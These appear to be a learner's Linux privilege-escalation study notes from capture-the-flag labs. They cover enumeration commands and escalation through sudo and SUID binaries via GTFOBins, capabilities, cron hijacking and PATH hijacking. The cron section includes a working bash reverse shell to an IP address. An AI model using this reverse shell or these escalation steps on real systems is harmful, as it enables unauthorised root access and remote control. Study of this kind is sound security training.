## <span style="color:rgb(255, 0, 247)">Enumeration Commands</span>

**OS ENUMERATION:-**
(Any file containing system information can be modified so check them all)
- <span style="color:rgb(166, 127, 173)">hostname</span>: the host name of the target machine
- <span style="color:rgb(166, 127, 173)">uname -a</span>: system information, details about the kernel: 
    `Linux home 6.8.0-41-generic` -----> Linux: OS / home: hostname / 6.8.0-41-generic: kernel version
- <span style="color:rgb(166, 127, 173)">cat /proc/version</span>: information about the target system processes, kernel version and compiler used to create it
- <span style="color:rgb(166, 127, 173)">cat /etc/issue</span>: information about the OS
- <span style="color:rgb(166, 127, 173)">ps</span>: see the running processes on a linux system
    `ps aux`: show processes for all users, display the user who launched the process, and processes not attached to a terminal
    `ps axjf`: show processes for all users, include processes with no controlling terminal, jobs format output and tree view
- <span style="color:rgb(166, 127, 173)">cron</span>: time-based job scheduler in linux, they sometimes run as privileged user so its useful if there is a script running that you can modify
    `cat /etc/crontab`: display contents of the system-wide crontab file
    `cd /var/spool/cron/` : holds per-user crontabs
    `cd /etc/cron.d/`: packages or admins can drop system-wide crontab-style files
    **FORMAT: minute - hour - day of month - month - day of week - user - task to be run (any executable string or binary)**
    Note: in minutes field, `5`: runs once per hour at minute 5, `*/5`: run every 5 minutes
    When a task has `* * * * *` this means it runs every minute
- <span style="color:rgb(166, 127, 173)">dpkg -l</span>: all installed packages and their version

**USER ENUMERATION:-**
- <span style="color:rgb(166, 127, 173)">id</span>: overview of the user privileges and group memberships, can specify other users too like `id khaled`
- <span style="color:rgb(166, 127, 173)">env</span>: show environmental varianbles (the PATH variable may have a compiler or a scripting language that could be used to run code on target system)
- <span style="color:rgb(166, 127, 173)">history</span>: check earlier commands, it is per-user
- <span style="color:rgb(166, 127, 173)">sudo -l</span>: the target system may be configured to allow users to run some (or all) commands with root privileges. this command can be used to list all commands your user can run using sudo, its used to check for possible bins to escalate using [GTFObins](https://gtfobins.org/) (example in Useful tips)
- <span style="color:rgb(166, 127, 173)">/etc/passwd</span>: discover users on the system
    To show a list of all *real* users: `cat /etc/passwd | grep /home | cut -d ":" -f1`

**NETWORK ENUMERATION:-**
- <span style="color:rgb(166, 127, 173)">ifconfig</span>: information about the network interfaces in the system
- <span style="color:rgb(166, 127, 173)">netstat</span>: display information about network connections, routing tables, interface statistics. common usage is 
    `netstat -tuln` → List all listening ports with protocol, IP, and port number. 
    `netstat -anp` → Show all connections with the process ID/program using them. 
    `netstat -r` → Display routing table in numeric form. 
    `netstat -i` → Show interface statistics

**FILE ENUMERATION:-**
- <span style="color:rgb(166, 127, 173)">ls -la</span>: list the contents of the current directory in long format including hidden files 
- <span style="color:rgb(166, 127, 173)">find</span>: searching the target system for information
    `find . -name flag.txt`: finds the file in the current directory and subdirectories
    `find /home -name flag.txt:`finds the file in /home directory and subdirectories
    `find / -type d -name config`: finds the directory named config under "/" (root directory)
    `find / -type f -perm 0777`: finds files with the 777 permissions (readable,writable,executable by all users)
    `find / -perm -a=x`: finds executable files
    `find / -perm -o x -type d 2>/dev/null`: find world-executable folders
    `find /home -user frank`: finds all files for user "frank" under "/home"
    `find / -cmin -60`: find files changed within the last hour ('a' instead of 'c' for "accessed")
    `find / -mtime -10`: find files that were modified in the last 10 days ('a' instead of 'm' for accessed)
    `find / -size +50M`: finds files with at least 50MB size (can be used with + or -)
    `find / -name python*`: find development tools and supported languages
    `find / -perm -u=s -type f 2>/dev/null`: find files with the SUID bit, which allows us to run files with higher privilege than current user
    **ADD `2>/dev/null` TO REMOVE ERROR MESSAGES**

*Tools to help with enumeration phase:* LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
other tools like: LinEnum / LES (Linux exploit suggester) / Linux smart enumeration / Linux priv checker
## <span style="color:rgb(255, 0, 247)">Escalation Techniques</span>

<span style="color:rgb(172, 57, 163)"><b>Sudo exploits:</b></span>
- run `sudo -l` to see the commands you can run as sudo
- go to https://gtfobins.org/ then search for the command and go to "sudo"
- for **example** if we have /usr/bin/nano, we go to nano and do these steps
 ![[Pasted image 20260719192540.png]]

<span style="color:rgb(172, 57, 163)"><b>SUID exploits:</b></span>
- SUID (set user identification) or SGID (set group identification) allow files to be executed with the permission level of the file owner or group owner respectively.
- they have an 's' bit set in their permissions, example: `-rwsr-xr-x` (these files are executed as the owner)
- `find / -type f -user root -perm -u=s 2>/dev/null`:  Finds files with SUID bit set that are owned by root, then use GTFObins SUID
- **Example:** we found /usr/bin/base64 with the suid bit, in gtfobins we used it to read flag3.txt with the command: `base64 /home/ubuntu/flag3.txt | base64 --decode`

<span style="color:rgb(172, 57, 163)"><b>Capabilities:</b></span> 
- Used to increase the privilege level of a process or binary
- `getcap -r / 2>/dev/null`: List enabled capabilities
- Some of the findings dont even have a SUID bit set so we only discover by getcap
- ![[Pasted image 20260720021659.png]]
    in GTFObins go to vim, then go to python under it, go to shell and then capabilities and copy the command between ' '. also change py to py3

<span style="color:rgb(172, 57, 163)"><b>Cron Jobs:</b></span>
- They run scripts at specific times with the privilege of their owner, example: `* * * * * * root /home/ubuntu/backup.sh`
- If there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges
- When a task has `* * * * *` this means it runs every minute
- Set up a reverse shell inside the script: `bash -i >& /dev/tcp/10.113.104.156/4545 0>&1`, and make sure the script is executable using chmod +x script.sh and set up a listener

<span style="color:rgb(172, 57, 163)"><b>PATH (im shit at this):</b></span> 
- If a folder for which your user has write permission is located in the path (`echo $PATH`), you could potentially hijack an application to run a script
- If we type “thm” to the command line, these are the locations Linux will look in for an executable called "thm".
- So if there is no path defined for "THM" the system will look at the PATH environment variable:
    ![[Pasted image 20260720231646.png]]
- We can add a directory to the PATH so the script looks for the executable there first, using the command: `export PATH=/tmp:$PATH`
- We create a script, compile it using gcc, set the SUID bit using `chmod u+s`
- If any writable folder is listed under PATH we could create a binary named "thm" under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege